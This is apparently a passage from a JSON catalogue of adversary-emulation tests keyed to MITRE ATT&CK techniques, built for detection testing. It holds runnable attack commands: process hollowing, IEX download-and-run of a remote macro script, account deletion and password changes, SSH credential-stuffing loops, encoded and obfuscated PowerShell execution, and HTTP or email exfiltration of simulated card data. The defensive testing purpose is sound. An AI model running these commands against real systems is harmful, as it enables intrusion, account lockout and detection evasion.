uncommonly used port utilizing telnet.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"port": {"description": "Specify uncommon port number", "type": "string", "default": "8081"}, "domain": {"description": "Specify target hostname", "type": "string", "default": "google.com"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires telnet\n", "prereq_command": "which telnet\n", "get_prereq_command": "echo \"please install telnet to run this test\"; exit 1\n"}], "executor": {"command": "echo quit | telnet #{domain} #{port}\nexit 0\n", "name": "sh"}}]}, "T1055.012": {"name": "Process Hollowing", "technique_id": "attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4", "external_id": "T1055.012", "data_components": ["Process Access", "OS API Execution", "Process Modification"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ", "atomic_tests": [{"name": "Process Hollowing using PowerShell", "auto_generated_guid": "562427b4-39ef-4e8c-af88-463a78e70b9c", "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n", "supported_platforms": ["windows"], "input_arguments": {"hollow_binary_path": {"description": "Path of the binary to hollow (executable that will run inside the sponsor)", "type": "string", "default": "C:\\Windows\\System32\\cmd.exe"}, "parent_process_name": {"description": "Name of the parent process", "type": "string", "default": "explorer"}, "sponsor_binary_path": {"description": "Path of the sponsor binary (executable that will host the binary)", "type": "string", "default": "C:\\Windows\\System32\\notepad.exe"}, "spawnto_process_name": {"description": "Name of the process to spawn", "type": "string", "default": "notepad"}}, "executor": {"command": ". \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "cleanup_command": "Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "RunPE via VBA", "auto_generated_guid": "3ad4a037-1598-4136-837c-4027e4fa319b", "description": "This module executes notepad.exe from within the WINWORD.EXE process\n", "supported_platforms": ["windows"], "input_arguments": {"ms_product": {"description": "Maldoc application Word", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\n", "name": "powershell"}}]}, "T1531": {"name": "Account Access Removal", "technique_id": "attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0", "external_id": "T1531", "data_components": ["Active Directory Object Modification", "User Account Modification", "User Account Deletion"], "kill_chain_phases": ["impact"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)\n\nIn Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. In Linux, the <code>passwd</code> utility may be used to change passwords. Accounts could also be disabled by Group Policy. \n\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. ", "atomic_tests": [{"name": "Change User Password - Windows", "auto_generated_guid": "1b99ef28-f83c-4ec5-8a08-1a56263a5bb2", "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"AtomicAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n", "supported_platforms": ["windows"], "input_arguments": {"user_account": {"description": "User account whose password will be changed.", "type": "string", "default": "AtomicAdministrator"}, "new_user_password": {"description": "Password to use if user account must be created first", "type": "string", "default": "User2ChangePW!"}, "new_password": {"description": "New password for the specified account.", "type": "string", "default": "HuHuHUHoHo283283@dJD"}}, "executor": {"command": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} #{new_password}\n", "cleanup_command": "net.exe user #{user_account} /delete >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Delete User - Windows", "auto_generated_guid": "f21a1d7d-a62f-442a-8c3a-2440d43b19e5", "description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"AtomicUser\" account was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"new_user_password": {"description": "Password to use if user account must be created first", "type": "string", "default": "User2DeletePW!"}, "user_account": {"description": "User account to be deleted.", "type": "string", "default": "AtomicUser"}}, "executor": {"command": "net user #{user_account} #{new_user_password} /add\nnet.exe user #{user_account} /delete\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Remove Account From Domain Admin Group", "auto_generated_guid": "43f71395-6c37-498e-ab17-897d814a0947", "description": "This test will remove an account from the domain admins group\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Requires the Active Directory module for powershell to be installed.\n", "prereq_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n", "get_prereq_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"}], "input_arguments": {"super_user": {"description": "Account used to run the execution command (must include domain).", "type": "string", "default": "domain\\super_user"}, "super_pass": {"description": "super_user account password.", "type": "string", "default": "password"}, "remove_user": {"description": "Account to remove from domain admins.", "type": "string", "default": "remove_user"}}, "executor": {"command": "$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord\nif((Get-ADUser #{remove_user} -Properties memberof).memberof -like \"CN=Domain Admins*\"){\n  Remove-ADGroupMember -Identity \"Domain Admins\" -Members #{remove_user} -Credential $Credential -Confirm:$False\n} else{\n    write-host \"Error - Make sure #{remove_user} is in the domain admins group\" -foregroundcolor Red\n}\n", "name": "powershell", "elevation_required": false}}, {"name": "Change User Password via passwd", "auto_generated_guid": "3c717bf3-2ecc-4d79-8ac8-0bfbf08fbce6", "description": "This test changes the user password to hinder access to the account using passwd utility.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"user_account": {"description": "User account whose password will be changed.", "type": "string", "default": "ARTUser"}}, "executor": {"command": "passwd #{user_account} #enter admin password > enter new password > confirm new password\n", "name": "sh", "elevation_required": true}}, {"name": "Delete User via dscl utility", "auto_generated_guid": "4d938c43-2fe8-4d70-a5b3-5bf239aa7846", "description": "This test deletes the user account using the dscl utility.\n", "supported_platforms": ["macos"], "input_arguments": {"user_account": {"description": "User account which will be deleted.", "type": "string", "default": "ARTUser"}, "user_password": {"description": "User password.", "type": "string", "default": "ARTPassword"}}, "executor": {"command": "dscl . -delete /Users/#{user_account} #enter admin password\n", "cleanup_command": "dscl . -create /Users/#{user_account} #enter admin password\ndscl . -create /Users/#{user_account} UserShell /bin/bash\ndscl . -create /Users/#{user_account} UniqueID 503\ndscl . -create /Users/#{user_account} NFSHomeDirectory /Users/#{user_account}\ndscl . -passwd /Users/#{user_account} #{user_password} #enter password for new user\n", "name": "sh", "elevation_required": true}}, {"name": "Delete User via sysadminctl utility", "auto_generated_guid": "d3812c4e-30ee-466a-a0aa-07e355b561d6", "description": "This test deletes the user account using the sysadminctl utility.\n", "supported_platforms": ["macos"], "input_arguments": {"user_account": {"description": "User account which will be deleted.", "type": "string", "default": "ARTUserAccount"}, "user_name": {"description": "New user name.", "type": "string", "default": "ARTUser"}, "user_password": {"description": "New user password.", "type": "string", "default": "ARTPassword"}}, "executor": {"command": "sysadminctl -deleteUser #{user_account} #enter admin password\n", "cleanup_command": "sysadminctl -addUser #{user_account} -fullName \"#{user_name}\" -password #{user_password}\n", "name": "sh", "elevation_required": true}}, {"name": "Azure AD - Delete user via Azure AD PowerShell", "auto_generated_guid": "4f577511-dc1c-4045-bcb8-75d2457f01f4", "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.", "supported_platforms": ["azure-ad"], "input_arguments": {"userprincipalname": {"description": "User principal name (UPN) for the Azure user being deleted", "type": "string", "default": "atomicredteam@yourdomain.com"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Check if AzureAD PowerShell module is installed", "prereq_command": "Get-InstalledModule -Name AzureAD", "get_prereq_command": "echo \"use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force\""}, {"description": "Check if AzureAD PowerShell module is installed", "prereq_command": "Update the input arguments so the userprincipalname value is accurate for your environment", "get_prereq_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""}], "executor": {"command": "Connect-AzureAD\n$userprincipalname = \"#{userprincipalname}\"\nRemove-AzureADUser -ObjectId $userprincipalname", "cleanup_command": "N/A", "name": "powershell"}}, {"name": "Azure AD - Delete user via Azure CLI", "auto_generated_guid": "c955c1c7-3145-4a22-af2d-63eea0d967f0", "description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.", "supported_platforms": ["azure-ad"], "input_arguments": {"userprincipalname": {"description": "User principal name (UPN) for the Azure user being deleted", "type": "string", "default": "atomicredteam@yourdomain.com"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Check if Azure CLI is installed and install manually", "prereq_command": "az account list", "get_prereq_command": "echo \"use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows\""}, {"description": "Check if Azure CLI is installed and install via PowerShell", "prereq_command": "az account list", "get_prereq_command": "echo \"use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\\AzureCLI.msi\""}, {"description": "Update the userprincipalname to meet your requirements", "prereq_command": "Update the input arguments so the userprincipalname value is accurate for your environment", "get_prereq_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""}], "executor": {"command": "az login\n$userprincipalname = \"#{userprincipalname}\"\naz ad user delete --id $userprincipalname", "cleanup_command": "N/A", "name": "powershell"}}]}, "T1110.004": {"name": "Credential Stuffing", "technique_id": "attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc", "external_id": "T1110.004", "data_components": ["User Account Authentication", "Application Log Content"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--f9f9e6ef-bc0a-41ad-ba11-0924e5e84c4c"], "description": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)", "atomic_tests": [{"name": "SSH Credential Stuffing From Linux", "auto_generated_guid": "4f08197a-2a8a-472d-9589-cd2895ef22ad", "description": "Using username,password combination from a password dump to login over SSH.\n", "supported_platforms": ["linux"], "input_arguments": {"target_host": {"description": "IP Address / Hostname you want to target.", "type": "string", "default": "localhost"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Requires SSHPASS\n", "prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo \"This test requires sshpass\" ; fi ;\n"}], "executor": {"name": "bash", "elevation_required": false, "command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n"}}, {"name": "SSH Credential Stuffing From MacOS", "auto_generated_guid": "d546a3d9-0be5-40c7-ad82-5a7d79e1b66b", "description": "Using username,password combination from a password dump to login over SSH.\n", "supported_platforms": ["macos"], "input_arguments": {"target_host": {"description": "IP Address / Hostname you want to target.", "type": "string", "default": "localhost"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Requires SSHPASS\n", "prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)\"\nbrew install hudochenkov/sshpass/sshpass\n"}], "executor": {"name": "bash", "elevation_required": false, "command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n"}}, {"name": "SSH Credential Stuffing From FreeBSD", "auto_generated_guid": "a790d50e-7ebf-48de-8daa-d9367e0911d4", "description": "Using username,password combination from a password dump to login over SSH.\n", "supported_platforms": ["linux"], "input_arguments": {"target_host": {"description": "IP Address / Hostname you want to target.", "type": "string", "default": "localhost"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires SSHPASS\n", "prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "pkg install -y sshpass\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n"}}, {"name": "Brute Force:Credential Stuffing using Kerbrute Tool", "auto_generated_guid": "4852c630-87a9-409b-bb5e-5dc12c9ebcde", "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n", "supported_platforms": ["windows"], "input_arguments": {"domaincontroller": {"description": "Domain controller where test will be run", "type": "string", "default": "$ENV:userdnsdomain"}, "domain": {"description": "Domain where you will be testing", "type": "string", "default": "$ENV:userdomain"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"}, {"description": "bruteforce.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n", "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"      \n"}}]}, "T1027": {"name": "Obfuscated Files or Information", "technique_id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a", "external_id": "T1027", "data_components": ["Process Creation", "Command Execution", "Script Execution", "Windows Registry Key Creation", "Module Load", "WMI Creation", "File Metadata", "OS API Execution", "File Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ", "atomic_tests": [{"name": "Decode base64 Data into Script", "auto_generated_guid": "f45df6be-2e1e-4136-a384-8f18ab3826fb", "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"shell_command": {"description": "command to encode", "type": "string", "default": "echo Hello from the Atomic Red Team && uname -v"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "encode the command into base64 file\n", "prereq_command": "if [ -e \"/tmp/encoded.dat\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "echo \"#{shell_command}\" | base64 > /tmp/encoded.dat\n"}], "executor": {"command": "cat /tmp/encoded.dat | base64 -d > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n", "cleanup_command": "rm /tmp/encoded.dat \nrm /tmp/art.sh\n", "name": "sh"}}, {"name": "Decode base64 Data into Script", "auto_generated_guid": "197ed693-08e6-4958-bfd8-5974e291be6c", "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n", "supported_platforms": ["linux"], "input_arguments": {"shell_command": {"description": "command to encode", "type": "string", "default": "echo Hello from the Atomic Red Team && uname -v"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "encode the command into base64 file\n", "prereq_command": "exit 1\n", "get_prereq_command": "echo \"#{shell_command}\" | b64encode -r - > /tmp/encoded.dat\n"}], "executor": {"command": "cat /tmp/encoded.dat | b64decode -r > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n", "cleanup_command": "rm /tmp/encoded.dat \nrm /tmp/art.sh\n", "name": "sh"}}, {"name": "Execute base64-encoded PowerShell", "auto_generated_guid": "a50d5a97-2531-499e-a1de-5544c74432c6", "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n", "supported_platforms": ["windows"], "input_arguments": {"powershell_command": {"description": "PowerShell command to encode", "type": "string", "default": "Write-Host \"Hey, Atomic!\""}}, "executor": {"command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n", "name": "powershell"}}, {"name": "Execute base64-encoded PowerShell from Windows Registry", "auto_generated_guid": "450e7218-7915-4be4-8b9b-464a49eafcec", "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n", "supported_platforms": ["windows"], "input_arguments": {"registry_key_storage": {"description": "Windows Registry Key to store code", "type": "string", "default": "HKCU:Software\\Microsoft\\Windows\\CurrentVersion"}, "powershell_command": {"description": "PowerShell command to encode", "type": "string", "default": "Write-Host \"Hey, Atomic!\""}, "registry_entry_storage": {"description": "Windows Registry entry to store code under key", "type": "string", "default": "Debug"}}, "executor": {"command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "cleanup_command": "Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}\n", "name": "powershell"}}, {"name": "Execution from Compressed File", "auto_generated_guid": "f8c8a909-5f29-49ac-9244-413936ce6d1f", "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n", "supported_platforms": ["windows"], "input_arguments": {"url_path": {"description": "url to download Exe", "type": "url", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1027.exe must exist on disk at PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1027.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\\" -Force\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\"\n", "cleanup_command": "taskkill /f /im calculator.exe >nul 2>nul\ntaskkill /f /im CalculatorApp.exe >nul 2>nul\n", "name": "command_prompt"}}, {"name": "DLP Evasion via Sensitive Data in VBA Macro over email", "auto_generated_guid": "129edb75-d7b8-42cd-a8ba-1f3db64ec4ad", "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Path of the XLSM file", "type": "path", "default": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm"}, "sender": {"description": "sender email", "type": "string", "default": "test@corp.com"}, "receiver": {"description": "receiver email", "type": "string", "default": "test@corp.com"}, "smtp_server": {"description": "SMTP Server IP Address", "type": "string", "default": "127.0.0.1"}}, "executor": {"command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments \"#{input_file}\" -SmtpServer #{smtp_server}\n", "name": "powershell"}}, {"name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP", "auto_generated_guid": "e2d85e66-cb66-4ed7-93b1-833fc56c9319", "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Path of the XLSM file", "type": "path", "default": "PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm"}, "ip_address": {"description": "Destination IP address", "type": "string", "default": "127.0.0.1"}}, "executor": {"command": "Invoke-WebRequest -Uri #{ip_address} -Method POST -Body \"#{input_file}\"\n", "name": "powershell"}}, {"name": "Obfuscated Command in PowerShell", "auto_generated_guid": "8b3f4ed6-077b-4bdd-891c-2d237f19410f", "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n", "supported_platforms": ["windows"], "executor": {"command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )\n", "name": "powershell"}}, {"name": "Obfuscated Command Line using special Unicode characters", "auto_generated_guid": "e68b945c-52d0-4dd9-a5e8-d173d70c448f", "description": "This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. \u1da0) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).\nReference:\nhttps://wietze.github.io/blog/windows-command-line-obfuscation\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "local_path": {"description": "Local path/filename to save the downloaded file to", "type": "path", "default": "Atomic-license.txt"}}, "executor": {"steps": "1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.\n\n\n  certutil 